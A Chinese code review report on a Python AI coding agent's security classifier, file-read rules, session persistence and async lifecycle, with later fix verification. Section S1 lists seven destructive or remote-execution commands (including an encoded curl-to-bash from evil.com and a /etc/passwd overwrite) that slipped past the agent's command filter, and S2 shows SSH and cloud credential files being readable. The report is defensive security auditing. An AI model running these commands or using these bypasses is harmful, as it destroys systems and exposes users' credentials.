# 代码全面评审报告

- **评审日期**：2026-08-28
- **评审范围**：`src/codeagent/` 全部 264 个 Python 文件（20,115 行），`tests/`（15,364 行）用于交叉验证
- **评审方法**：分层并行静态审查 + **安全分类器实测验证**（41 条攻击载荷）+ 关键结论逐条源码复核 + 全量测试套件运行
- **测试基线**：`1022 passed, 3 failed`（3 条失败见 M18，均由宿主 bash 环境触发，但暴露了真实设计缺陷）

---

## 总体结论

| 维度 | 评价 |
|---|---|
| 架构分层 | **优秀**。`core/` 与 `session/` 的依赖方向约束 100% 无违规；`core/ports.py` 用 Protocol 做依赖注入，边界守得干净 |
| 凭据安全 | **优秀**。全链路 `SecretStr`，零硬编码密钥，无裸 `except`，无 TODO/FIXME 残留 |
| 安全分类器 | **严重不足**。实测 41 条载荷中 **7 条高危操作被判 `allow`**，保护实质依赖字面量正则匹配 |
| 持久化正确性 | **有严重风险**。锁仅进程内有效，回滚策略可擦除并发写入 |
| 异步/资源释放 | **有系统性泄漏**。9 处 fire-and-forget 任务不受关闭管控 |
| 代码规范 | **良好**。命名、类型注解、docstring 一致性高；存在局部重复与上帝对象 |

---

# 一、严重问题（9 项）

> 建议优先修复，均具备可实际触发的破坏路径。

---

## S1. 安全分类器存在多条可绕过的执行路径（实测 `allow`）

**文件**：
- `src/codeagent/tools/security/classifier.py:23-36, 73-145, 161-191`
- `src/codeagent/tools/security/bash_rules.py:11-22, 188-222`

**问题描述**：
对分类器注入 41 条攻击载荷实测。DENY 判定**实质依赖字面量正则** `\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)+/`。凡是绕过该字面字符串的表达，保护即失效。`perl -e`/`ruby -e`/`awk`/`ssh`/`git config` 几条被拒，仅仅是因为载荷里恰好含有 `rm -rf /` 这一子串。

下列载荷**实测返回 `allow`（无任何拦截、无警告）**：

| 载荷 | 后果 |
|---|---|
| `node -e "require('fs').rmSync('/',{recursive:true})"` | 删除根目录 |
| `echo Y3VybCBodHRwOi8vZXZpbC5jb218c2g=\|base64 -d\|bash` | **混淆后的远程代码执行** |
| `xargs rm -rf < /tmp/x` | 绕过 `rm` 段分析递归删除 |
| `echo hi \| tee /etc/passwd` | 覆写系统口令文件 |
| `echo pwn > /etc/cron.d/x` | 写入计划任务实现持久化 |
| `docker run -v /:/host alpine rm -rf /host` | 挂载宿主机根目录后删除 |
| `tar -cf - . \| tar -xf - -C /` | 向根目录解包覆盖 |

**根因**：
1. `bash_rules.py:21` `_INTERPRETER_WRAPPERS = ("bash","sh","zsh")` 与 `classifier.py:113` 的 `interpreter_inline` 只覆盖 `bash/sh/zsh/python`，**未覆盖 `node`、`perl`、`ruby`、`awk` 的 `-e` 内联执行**；
2. `classifier.py:124-145` 的 ask_rules 是**按首个 token 的精确匹配白名单**，缺 `xargs`、`tee`、`docker`、`tar`、向 `/etc`、`/boot`、`/sys` 等系统路径的重定向写入；
3. 无编码/混淆检测（`base64 -d`、`xxd -r` 等解码后管道给解释器完全不可见）。

**改进建议**：
1. **短期**：`_INTERPRETER_WRAPPERS` 扩展为 `("bash","sh","zsh","python","python3","node","perl","ruby","php","lua")`，并新增 `-e`/`--eval` 与 `-c` 同等对待；ask_rules 增补 `xargs`（当后续段含 `rm`）、`tee`、`docker run -v`、`tar -C /`、重定向目标为系统路径。
2. **中期**：把「解码器 + 管道 + 解释器」这一组合（`base64 -d`|`sh`、`curl`|`sh` 已有）抽象为通用的**污点传播规则**，凡是经过解码器的字节流进入解释器一律 ASK。
3. **根本**：当前「默认放行 + 正则黑名单」模型本身脆弱。建议对 bash 工具改为**默认 ASK、显式白名单 ALLOW** 的最小权限模型，仅 `DEFAULT_ALLOWLIST` 中的命令自动执行。
4. 为上述 7 条载荷补充回归测试，纳入 CI。

---

## S2. 敏感文件读取无实质边界，SSH/云凭据可直接读取

**文件**：`src/codeagent/tools/security/filesystem.py:11-13, 56-70`

**问题描述**：
```python
_SECRET_PATH_RE = re.compile(
    r"(^|[/\\])\.env([^a-z0-9]|$)|\.codeagent(/|$)", re.IGNORECASE
)
```
敏感路径仅覆盖 `.env` 与 `.codeagent` 两项。而 `classify_file` 对读操作越界**固定放行**：
```python
if tool_name in _READ_TOOLS:
    return SecurityDecision(ALLOW, f"越界读取: {path}", warning=True)
```
实测结果：

| 工具 | 路径 | 判定 |
|---|---|---|
| `read` | `C:/Users/<user>/.ssh/id_rsa` | **allow** |
| `read` | `C:/Users/<user>/.aws/credentials` | **allow** |
| `read` | `.git-credentials` | **allow** |
| `read` | `D:/project/codeAgent/../../Windows/win.ini` | **allow** |

`warning=True` 只是给人类看的提示，**不产生任何阻断**。SSH 私钥、AWS 凭据、Git 凭据均可被模型直接读入上下文，并可能随会话持久化写入磁盘、或被后续工具调用带出。

**改进建议**：
1. 扩充敏感路径模式：`.ssh(/|$)`、`id_rsa`、`id_ed25519`、`.aws`、`.gnupg`、`.git-credentials`、`.netrc`、`.npmrc`、`.pypirc`、`credentials`、`*.pem`、`*.key`、`*.pfx`、`secret`、`token`。
2. 对命中的敏感文件由 `ALLOW+warning` 改为 **`ASK`**，把决定权交回用户；对私钥类（`id_rsa`、`*.pem`、`*.key`）建议直接 `DENY`。
3. 判定前先做 `Path.resolve()`，避免 `..`/符号链接绕过（当前 `classify_file` 直接对原始字符串匹配，`within_workspace` 内部才 resolve，两者口径不一致）。

---

## S3. 会话持久化锁仅进程内有效，跨进程完全无保护

**文件**：`src/codeagent/session/persistence/locking.py:8-22`（已复核确认）

```python
_path_locks: dict[str, threading.RLock] = {}
def path_lock(path: str | Path) -> threading.RLock:
```
锁是**纯进程内 `threading.RLock`**，无任何 OS 级锁（`fcntl.flock` / `msvcrt.locking` / 独立 lock 文件）。两个 `codeagent` 进程（例如 TUI 与后台任务、或两个终端窗口）操作同一 `~/.codeagent/sessions/<id>.jsonl` 时，追加写入会交错，索引与数据文件分叉。

**改进建议**：改为独立 `.lock` 文件 + `fcntl.flock(LOCK_EX|LOCK_NB)`（POSIX）/ `msvcrt.locking`（Windows），保留 `RLock` 做进程内串行；锁获取必须带超时与陈旧锁清理，避免死锁。

---

## S4. `commit_turn` 回滚采用整文件重写，可擦除其它进程的合法写入

**文件**：`src/codeagent/session/persistence/jsonl_store.py:304, 329-335`（已复核确认）

```python
original = path.read_bytes()          # 每轮全量读入内存
...
except BaseException:
    path.write_bytes(original)        # 整文件覆写回滚
```
三重问题：
1. **性能**：每轮 O(file_size) 读 + 潜在 O(file_size) 写，整个会话累计 **O(n²) I/O**；
2. **原子性**：回滚本身非原子——`write_bytes` 内部是 truncate + 重写，中途崩溃将留下被截断的文件；
3. **正确性**：结合 S3，进程 B 在 A 的快照之后追加的内容，会被 A 的 `write_bytes(original)` **静默删除**。

**改进建议**：记录 `original_size = path.stat().st_size`，失败时改用 `os.truncate(path, original_size)`——只截断、不重写，成本 O(1) 且不会覆盖他人写入。需与 S3 的跨进程锁配合。

---

## S5. 会话压缩可清空全部历史，并导致上下文「双重生效」

**文件**：
- `src/codeagent/session/session.py:315-352`
- `src/codeagent/session/compaction/policy.py:30-33`

**问题描述**：
`session.py` 只挡了 `cut <= 0`，**未挡 `cut >= len(history)`**：
```python
cut = find_cut_point(self._history, self._compact_budget)
if cut <= 0: ... return False
window = self._history[:cut]
kept   = self._history[cut:]          # cut == len → kept == []
```
而 `policy.py:30-33` 在向后扫描找不到 `user` 消息时 `break`，返回初始值 `index = len(messages)`，正好产出 `cut == len`。

触发路径：`run_agent_loop_continue`（`loop.py:422-433`，`prompt=None` 不追加 user 消息）产生的无 user 历史。

后果链：`kept=[]` → `first_kept_entry_id=""` → 重载时 `load_context`（`jsonl_store.py:264-265`）因 cut 为空**回退全量消息** → 摘要与全部原始消息同时进入上下文，即**压缩不但没减负，反而增加了一整份摘要**，且原始历史被「清空」的错觉掩盖。

**改进建议**：
1. `session.py:316` 改为 `if cut <= 0 or cut >= len(self._history): return False`；
2. `policy.py:32` 的 `break` 改为不更新 `index` 的安全退出（返回「无可安全切点」哨兵值）；
3. 补回归测试：构造无 user 消息的历史调用 `compact()`，断言不产生空 `kept`。

---

## S6. 非流式 HTTP 读超时为无限，可导致永久挂起

**文件**：`src/codeagent/ai/transport/openai_compat.py:64`（已复核确认）

```python
self._timeout: httpx.Timeout = httpx.Timeout(connect=10.0, read=None, write=30.0, pool=10.0)
```
注释说明 `read=None` 是为流式首 token（长思考模型）设计，但**同一个 `_timeout` 也被非流式 `generate()` 使用**（`openai_compat.py:175`）。服务端 accept 连接后不响应 → 永久挂起，无超时、无重试、无报错，TUI 直接假死。`pool=10.0` 只限制获取连接，不限制总时长。

**改进建议**：非流式使用独立的 `httpx.Timeout(read=120.0, ...)`；流式保留长 read，但用 `asyncio.timeout()` 包裹**首帧等待**（如首 token 90s 超时），并叠加空闲超时。

---

## S7. 主对话路径完全没有异常捕获，错误静默消失

**文件**：`src/codeagent/app/tui/conversation_coordinator.py:134-140`

```python
async def _run() -> None:
    try:      await self._task_supervisor.run(text, mode=selected_mode)
    finally:  self._task_active = False; self._task_supervisor = None; ...
```
只有 `finally`、**没有 `except`**。`TaskSupervisor.run` 仅捕获 `CancelledError`，因此 `session.run` / `inspector.capture` / `resolver.resolve` 抛出的任何异常都会变成 **never-retrieved task exception**——界面零反馈、任务静默「消失」，用户以为模型在思考。

对比同类路径 `_run_compact` / `_run_retry` 都有 `except Exception`，**处理不一致**。

**改进建议**：补 `except Exception as exc: self.model.append_error(...)`，并与 S9 的任务追踪配合，确保异常可见。

---

## S8. TUI 事件循环内执行无超时的同步 `git clone`

**文件**：`src/codeagent/app/skill_packages.py:341-346`（已复核确认）

```python
result = subprocess.run(
    ["git", "clone", "--depth", "1", git_source, str(checkout)],
    capture_output=True, text=True, check=False,
)   # 无 timeout
```
调用链：`command_coordinator.py:301`（同步方法）→ `tui_factory.py:116` → `skill_packages.py:341`。该同步调用**直接跑在 Textual 事件循环上**，克隆大仓库期间 TUI 完全冻结且无法中断。

**改进建议**：改 `await asyncio.to_thread(...)` 并显式传 `timeout=`；或复用 `task_verification.py:313` 已有的 `asyncio.create_subprocess_exec` 写法。同类问题见 `task_verification.py:137` 与 `tui/benchmark.py:127` 的 `subprocess.run`。

---

## S9. 9 处 fire-and-forget 异步任务不受关闭管控

**文件**：
- `app/composition/runtime_factory.py:71-78`（已复核确认）
- `app/tui/session_coordinator.py:145, 179`
- `app/tui/command_coordinator.py:210, 417`
- `core/agent.py:105-106`
- `session/session.py:252-259`、`session/manager.py:277-283`

**问题描述**：
```python
# runtime_factory.py:71-78
def close_sync(self) -> None:
    try:  loop = asyncio.get_running_loop()
    except RuntimeError:  asyncio.run(self.close())
    else:  loop.create_task(self.close())   # ← 句柄丢弃，无人 await
```
TUI 内 `/model` 热切换即走此路径（`tui_factory.py:233`）。进程退出时产生 `Task was destroyed but it is pending`，MCP 子进程与 HTTP 连接静默泄漏。

`view.py:216-224` 的关闭清单**只含 3 个句柄**，而 TUI 实际创建 7 类任务，未受控的 4 处（session_coordinator 的 compact/retry、command_coordinator 的 skill 加载与配置重建）在 `/compact` 后立刻 Ctrl+C 时仍在运行，而 `manager.close()` 已开始。

另 `core/agent.py:105-106` 对每个事件监听器都 `create_task`，而 `_emit` 在每次流式文本增量时调用（`loop.py:129`），任务数量随 delta 线性增长。

**改进建议**：
1. 在 `TuiApp` 与 `Agent` 上各建统一的 `_track_task(task)` 集合，所有协调器/监听器经它登记，shutdown 时遍历 `cancel()` + `await gather(..., return_exceptions=True)`；
2. `close_sync` 返回 task 供调用方持有，或让 TUI 侧改走已存在的 async 版本 `close_runtime_for_config_async`（`runtime_factory.py:114`）；
3. `core/agent.py` 在 `_execute` 的 `finally`（`:160`）中取消并回收监听器任务。

---

# 二、中等问题（19 项）

---

## M1. 摘要器 HTTP 客户端永不关闭
**文件**：`app/composition/tui_factory.py:162-173`、`app/composition/runtime_factory.py:215-227`（已复核确认）
`_LazySummarizer` 只有 `summarize()`，**没有 `aclose()`**，也不在 `_RUNTIMES_BY_CONFIG` 索引中，因此 `_close_resources`（`runtime_factory.py:50-69`）永远不会关闭它。首次会话压缩触发后，其内部 `httpx.AsyncClient` 直到进程退出都不释放。
**建议**：给 `_LazySummarizer` / `LlmSummarizer` 增加 `aclose()` 并在 `_close_resources` 调用；或让摘要器直接复用主模型 client。

## M2. JSONL 追加无 `fsync`，保护强度倒置
**文件**：`session/persistence/jsonl_store.py:584-589`
```python
with path.open("a", encoding="utf-8") as f:
    f.write(line)
```
无 `flush()` + `os.fsync()`，断电/崩溃丢失尾部字节。**反常的是索引文件反而做了 fsync**（`index.py:284-285`）——数据文件比索引文件更脆弱。
**建议**：`f.write(line); f.flush(); os.fsync(f.fileno())`。

## M3. `create()` 存在 TOCTOU
**文件**：`session/persistence/jsonl_store.py:157` 与 `:185`
`if path.exists(): raise` 在 `with _lock_for(path)` **之前**执行，检查与写入之间未持锁，并发创建同名会话会互相覆盖。同文件 `fork`（`:522-524`）已正确把检查放在锁内，可参照修正。

## M4. 压缩可能无法收敛，形成「压缩→不降→再压缩」循环
**文件**：`session/compaction/policy.py:35`
```python
if total > 0 and total + turn_tokens > budget:
    break
```
`total > 0` 使**最近一轮无条件保留**，即使单轮 token 已超预算。此时压缩后上下文不下降，而 `_should_auto_compact()`（`session.py:381`）每轮仍返回 `True`。
**建议**：移除 `total > 0` 豁免，或至少校验「压缩后总量严格小于压缩前」，否则拒绝写入 compaction entry。

## M5. 自动压缩失败后每轮重试，且重复发错误事件
**文件**：`session/session.py:361, 573-574, 598-624`
`compact()` 内部 `except Exception` 先 emit 一次 `COMPACTION_FINISHED(success=False)` 再 `raise`，`run()` 的 `except` 又 emit 一次 `ERROR`，并把 `last_failure` 置为压缩失败——**掩盖了本轮已成功提交的事实**。无任何退避/熔断，summarizer 持续不可用时每轮都触发。
**建议**：`compact()` 内不重复 emit，交由 `run()` 统一发；增加「连续失败 N 次后关闭自动压缩」标志位。

## M6. 索引一致性依赖 `(size, mtime_ns)`，弱文件系统上会误判
**文件**：`session/persistence/index.py:39-41, 200`
```python
return {"size": stat.st_size, "mtime_ns": stat.st_mtime_ns}
```
这是索引缓存与数据文件之间**唯一**的一致性守卫。mtime 在 FAT / 部分网络挂载上分辨率粗（秒级），写入后 mtime 不变而 size 恰好回退到相同值时（S4 的回滚正是制造此场景），陈旧索引会被判定为有效 → 用量统计、`lastActivityAt`、标题静默错误。
**建议**：改为存储已消费的**字节偏移量 + 行数**，比 mtime 可靠且仍是 O(1)。

## M7. 4 处 `except asyncio.CancelledError` 吞掉取消，破坏结构化并发
**文件**：`app/task_supervisor.py:219-221`、`app/task_verification.py:283-291`、`app/tui/session_coordinator.py:339-340`、`app/tui/render_coordinator.py:137-138`
捕获后**正常返回**，导致外层 `asyncio.timeout` / `TaskGroup` 的取消被吞，`task.cancelled()` 返回 False 而 `cancelling()` 计数残留。
**建议**：保住状态语义但补 `raise`（或 `if task.cancelling(): raise`）；动画循环改用 `finally` 替代 `except`。

## M8. 用量格式化重复实现，且口径不一致
**文件**：`app/main.py:250-261` 与 `app/tui/command_coordinator.py:147-167`（已复核确认）
两处近乎逐行相同（同一句 `f" · 缓存命中约 {ratio:.1f}% ({cached}/{input_k})"`、同一个 `min(100.0, ...)` 钳制），但**口径不同**：
- `main.py`：`output = usage["output_tokens"]`，**不含 reasoning**；
- `command_coordinator.py`：`output = output_tokens + reasoning_tokens`。

同一会话在 headless 与 TUI 下显示的输出 token 数不一致。
**建议**：抽 `format_usage(input, output, cached, *, reasoning=0) -> str` 到 `tui/status.py`，统一是否并入 reasoning。

## M9. Windows 上密钥文件不收紧权限
**文件**：`app/config.py:195-196`
```python
if os.name != "nt": os.chmod(tmp, 0o600)
```
本项目主平台为 Windows，写有 `*_API_KEY` 的 `~/.codeagent/.env` 落到默认 ACL，同机其他用户可读。
**建议**：Windows 分支用 `icacls` 或 `win32security` 显式裁剪继承的 ACL。

## M10. `.env` 值转义未处理换行，可注入任意行
**文件**：`app/config.py:151-158` `_quote_env_value`
只转义 `#`/`=`/空白/引号。含 `\n` 的密钥会把后续任意行注入 `.env`。
**建议**：先 `if "\n" in value or "\r" in value: raise ValueError`。

## M11. 命令分派无错误边界
**文件**：`app/tui/interaction.py:333` `handler(cmd)` 裸调用
`/skills install` 抛 `shutil.Error`（非 `OSError`，`command_coordinator.py:302` 未覆盖）时，异常直冲 Textual 的 `on_input_submitted`。
**建议**：包一层 `try/except Exception`，统一 `append_info` + 日志。

## M12. 会话异步动作只捕 `ValueError`
**文件**：`app/tui/session_coordinator.py:262-272`（`_run_retry` 同 `:184`）
存储层的 `OSError`、`RuntimeError` 被静默丢弃。
**建议**：改为 `except Exception` 并回显错误。

## M13. `_task_supervisor` 可被过期任务的 `finally` 清掉
**文件**：`app/tui/conversation_coordinator.py:137-139`
`finally` 无条件 `self._task_supervisor = None`。若旧 `_run` 收尾晚于新任务创建（取消后立刻重试），会清掉**新** supervisor 的引用，导致 `_quit()`/`_interrupt()`（`:72`、`:90`）无法取消真正运行的任务。当前被 `interaction.py:245` 的前置判断挡住，属隐患而非活跃 bug。
**建议**：改为 `if self._task_supervisor is supervisor: self._task_supervisor = None`（捕获创建时的局部引用）。

## M14. `usage` 属性每次访问都全量扫描 JSONL
**文件**：`session/session_persistence.py:64-68` → `jsonl_store.py:416-427`
该属性被 TUI 命令路径调用（`command_coordinator.py:156`），历史越长越慢。
**建议**：在 `commit_turn` 成功后把 usage 累加值缓存到 `SessionPersistence` 实例。

## M15. `SessionManager._sessions` 无界增长
**文件**：`session/manager.py:379`
只在显式 `dispose()` 时移除。每个 `AgentSession` 持有**完整消息历史**，长驻 TUI 中反复 `create()` 会持续累积内存。
**建议**：改为 LRU 上限（保留最近 N 个），淘汰时文件仍在，可 `switch` 恢复。

## M16. 每次模型调用重复计算上下文预算两次
**文件**：`core/loop.py:88` 与 `:101` 各调用一次 `_describe_context_budget`
每次都做 `list(messages)` + `list(config.tools)`，并对每个工具定义 `json.dumps`（`context_budget.py:86-99`）。一轮 ReAct 有 k 次迭代 → 2k 次全历史 + 全工具的重序列化。
**建议**：工具定义 token 数在 run 开始时缓存一次（工具集在 run 期间不变）；prepared 前后只重算 messages 部分。

## M17. 模型参数校验不完整
**文件**：
- `ai/catalog/store.py:71-73`：`max_tokens` 只校验类型不校验范围（紧邻的 `context_window` 有 `< 1` 检查，不一致）。`maxTokens: -1` 会被原样送进请求体。
- `ai/transport/openai_compat.py:134-135`：`reasoning_effort` 无白名单校验。`KNOWN_EFFORTS`（`model_selection.py:12`）**只**用于解析 `model:effort` 内联后缀，env/CLI 传入的任意串不做校验。
- `store.py:100-107`：未校验 `reasoning` 类型，`"reasoning": "false"` 也是真值。
- `openai_compat.py:55, 120-121`：`base_url` 无 scheme 白名单，f-string 拼接 URL。
**建议**：补齐范围/白名单校验，非法值在本地报错而非发给供应商；`base_url` 用 `urlparse` 校验 scheme ∈ {http, https} 且无 query/fragment。

## M18. 测试非密闭：依赖宿主 bash 的启动速度与清洁度
**文件**：`tests/tools/test_execution.py:28, 42`、`tests/tools/atomic/test_bash.py`
全量套件 `1022 passed, 3 failed`。失败根因已实测定位：本机 `resolve_bash()` 解析到的是 `PortableGit`，其 `/etc/msystem` 缺失导致**每次调用都向 stderr 输出噪声**，且**冷启动耗时 6.5 秒**（实测 3 次：6.66s / 6.55s / 6.50s），超过测试断言的 `timeout=5`，故 `timed_out=True`、`returncode=1`、`stdout=''`。

这暴露两个**真实的设计缺陷**（不只是环境问题）：
1. `resolve_bash()`（`tools/execution/shell.py:84-109`）只检查文件存在，**不校验该 bash 是否可用、是否正常**；任何 PATH 上的残缺 Git Bash 都会被选中。
2. `ProcessRunner` 固定使用 `bash -lc`（`process.py:86, 121`），**登录 shell 会 source `/etc/profile` 等启动脚本，其输出被当作命令结果的一部分返回给模型**。这意味着宿主环境的配置噪声会持续污染 LLM 上下文。

**建议**：
1. `resolve_bash()` 增加健康检查：执行一次 `bash -c 'echo ok'` 并校验退出码与输出，不通过则继续找下一个候选（当前 `all_which` 已返回全部候选，具备改造条件）；
2. 评估是否可改用 `bash -c` 而非 `-lc`（`-l` 会引入 profile 副作用与额外启动开销），或显式过滤启动脚本的 stderr；
3. 测试改为「注入已知可用 bash」或放宽 timeout 并断言 `stderr` 中不含 `/etc/msystem`，使其具备跨环境密闭性。

## M19. `--yes` 将全部 ASK 降级为 ALLOW，与 S1/S2 叠加放大风险
**文件**：`app/main.py:52-55, 81, 89` → `app/composition/policy_factory.py:37-40`
```python
if decision.action == "ask" and approval_mode == "allow":
    return PolicyDecision("allow", decision.reason)
```
`codeagent --yes` 会把 `sudo`、`curl|sh`、`rm -r`、`python -c`、`chmod -R`、`find -delete`、`dd of=/dev/...` 全部自动放行。帮助文本已声明「显式承担风险」，属设计意图，但**在 S1/S2 修复前，该标志的实际风险面远大于文档描述**（因为本应 ASK 之外的命令还有 7 类被判 allow）。
**建议**：S1/S2 修复前，考虑在 `--yes` 下对 DENY 级危险模式以外的「高危但当前被 allow 的组合」（`tee /etc`、`docker -v`、`base64|sh`）补一层硬拦截；至少在帮助文本中列出具体放行范围。

---

# 三、轻微问题（12 项）

| # | 文件 | 问题 | 建议 |
|---|---|---|---|
| L1 | `session/persistence/locking.py:8` | `_path_locks` 字典只增不减，长驻 TUI 持续泄漏 | 改用 `weakref.WeakValueDictionary` 或 LRU 清理 |
| L2 | `session/compaction/details.py:22` | `if path not in ops[bucket]` 对 list 线性查找，O(n²) | 改用 `dict.fromkeys` 去重（同文件 `session.py:330-337` 已正确） |
| L3 | `core/context_budget.py:81` vs `session/compaction/policy.py:16` | 两处 token 估算实现不一致（一个用 `sort_keys=True`），同一消息算出不同 token 数，使预算显示与压缩切点互相矛盾 | 统一为单一实现 |
| L4 | `bash_rules.py:35`、`classifier.py:41`、`atomic/bash.py:70` | **同一段 `shlex(punctuation_chars=True)` 分词逻辑重复 3 处**，且 `bash_rules` 失败时保守拒绝、`classifier` 却回退到朴素 `.split()`（不处理引号），存在**解析器差异导致的绕过面** | 抽取公共分词模块，统一失败行为 |
| L5 | `session/persistence/jsonl_store.py:251, 260, 263` | `load_context` 最多三次全文件扫描 | 合并为单遍扫描 |
| L6 | `core/loop.py:368`、`session/session.py:426` | `list.pop(0)` / `list.insert(0, ...)` 为 O(n)；`session.py:423/501-505` 每轮产生 3 份全历史拷贝 | 换 `collections.deque`；摘要消息改为在模型视图边界注入 |
| L7 | `app/tui/commands.py` 与 `app/tui/interaction.py:306-329` | 命令注册表双份真相，需手工同步，注释自认「理论不可达」 | 把 handler 直接挂进 `_COMMANDS` spec |
| L8 | `app/tui/command_coordinator.py:50-145` | `_cmd_status` 近 100 行，混装会话/运行时/技能/MCP/用量五类渲染，与 `status.py` 职责重叠 | 拆分，渲染逻辑下沉到 `status.py` |
| L9 | `ai/transport/openai_compat.py:94-98` | `aclose()` 抛异常后 `_client` 未置空，后续复用已关闭的 client | `try/finally: self._client = None` |
| L10 | `ai/model/types.py`、`ai/transport/openai_compat.py:51` | `temperature` 是**死参数**：`ModelSpec` 无该字段，7 个 provider 均不传，恒为 None | 要么接入，要么删除 |
| L11 | `ai/transport/sse.py:63`、`:27-30` | ① 畸形 SSE 帧被 `except json.JSONDecodeError: return []` 静默丢弃，无日志；② `aiter_lines()` 对超长单行无上限 | 加 `logger.warning`；改 `aiter_bytes()` + 自管 buffer 并设上限 |
| L12 | `session/json_file_store.py:3` | 从 `jsonl_store` 导入私有名 `_lock_for`，跨模块耦合私有实现 | 提升为公开 `_path_lock` 别名或改走 `locking.path_lock` |

---

# 四、值得肯定的部分

评审中也确认了若干**质量明显高于平均**的实现，建议作为后续重构的参考范式：

1. **MCP 客户端生命周期管理**（`tools/mcp/client.py`）——`_active_calls` 集合跟踪在途 Future、`close()` 逐个 cancel、`async with` 保证会话与 stdio 传输收尾、线程 `join(timeout=5.0)` 防子进程泄漏、`acall_tool` 在 `CancelledError` 时用 `asyncio.shield` 做优雅取消后**正确 re-raise**。这是全项目资源释放做得最扎实的模块。
2. **依赖方向约束零违规**——`core/` 仅 import `codeagent.core.*`，`session/` 仅 import `core.*` 与 `session.*`，`AGENTS.md` 声明的架构规则被严格遵守。
3. **凭据处理**——全链路 `SecretStr`，API key 从不进入 `Settings`（`Settings` 仅含 `llm_provider`），`configured_providers()` 只返回 provider 名；全仓零硬编码密钥。
4. **JSONL 部分写入容错**（`jsonl_store.py:119-122`）——解析时跳过 `JSONDecodeError` 行而非中断整个文件，崩溃恢复设计得当。
5. **索引原子写入**（`index.py:280-288`）——temp + rename + fsync，是教科书式实现（可惜数据文件没跟上，见 S4/M2）。
6. **代码整洁度**——零裸 `except`、零 `except: pass`、零 TODO/FIXME/HACK 残留、无可变默认参数。
7. **路径穿越防护**（`skill_packages.py` 的 `_inside()`、`skills.py:161-174` 的 `package_path_escape`）——技能包加载路径校验完整，且拒绝 symlink。

---

# 五、建议的修复顺序

```
第一批（数据完整性与远程执行风险）
  S1 安全分类器绕过  →  S2 敏感文件读取  →  S3 跨进程锁  →  S5 压缩清空历史

第二批（稳定性与可观测性）
  S9 任务泄漏  →  S7 主对话零捕获  →  S6 HTTP 读超时  →  S8 同步 git clone  →  S4 整文件回滚

第三批（正确性与维护性）
  M4 压缩收敛  →  M5 压缩失败重试  →  M6 索引一致性  →  M8 用量口径  →  M7 CancelledError
  →  M1 摘要器泄漏  →  M18 测试密闭性  →  M17 参数校验

第四批（清理）
  L1–L12
```

**回归测试建议补充**（对应上述高风险项）：
- 同毫秒 mtime 下的索引失效（M6）
- 无 user 消息历史调用 `compact()`（S5）
- 单轮超预算时的压缩收敛（M4）
- S1 表中 7 条载荷的判定断言（防回归）
- S2 表中 4 条敏感路径的读取判定断言

---

# 六、2026-08-28 修复复核

本次审查后的工作区修复已覆盖以下高风险项：

| 项目 | 当前状态 | 复核依据 |
|---|---|---|
| S1 安全命令绕过 | 已修复 | 统一 shell 分词；补充解释器内联、编码管道、xargs、系统路径写入、Docker 根挂载、tar 根解包回归测试 |
| S2 敏感凭据路径 | 已修复 | `.ssh`、`.aws`、Git/云凭据、私钥和证书路径解析后拒绝 |
| S3/S4 JSONL 并发与回滚 | 已修复 | sidecar OS 锁、append `fsync`、按原始文件长度截断回滚、create 检查移入锁内 |
| S5/M4 压缩边界 | 已修复 | 无安全切点或切点覆盖全部历史时不压缩 |
| S6 模型请求超时 | 已修复 | 非流式 read timeout 有限；流式保留长首 token 等待 |
| S7-S9 异步/TUI 生命周期 | 已修复 | TUI 任务登记与关闭回收、异常可见、取消传播、监听任务收尾、Package Git 下载超时 |
| M1/M6/M7/M10/M17 | 已修复 | 摘要器关闭、索引指纹增强、取消传播、环境值校验、模型/目录参数校验 |
| 核心职责过载 | 部分修复 | `core/loop.py` 已拆为循环、模型请求、工具调用三个模块；session 大文件仍需后续拆分 |
| 依赖与文件大小 | 部分修复 | `core/loop.py` 已降至 231 行；`session.py`、JSONL store、TUI backend 等历史大文件仍超过 300 行 |

本轮聚焦回归测试结果：`805 passed`；Ruff 质量门禁通过；`openspec validate --changes` 为 `2 passed`，`openspec validate --specs` 为 `12 passed`。未以此结果替代跨平台 CI 和交付前全量测试。

仍需作为后续变更处理的事项包括：session facade/turn runner 拆分、TUI 与 composition 中的其余大文件、Windows 文件权限加固、默认安全策略从黑名单逐步收敛到最小权限白名单，以及测试环境对 bash 的完全密闭化。
